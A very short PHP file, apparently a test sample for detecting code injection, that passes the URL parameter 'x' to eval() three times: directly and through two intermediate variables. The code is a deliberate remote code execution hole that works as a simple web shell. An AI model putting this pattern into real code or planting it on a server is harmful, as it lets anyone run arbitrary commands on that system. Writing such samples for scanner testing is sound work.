<?php
$a = $_GET["x"];
eval($a);

$b = $a;
eval($b);

eval($_GET["x"]);
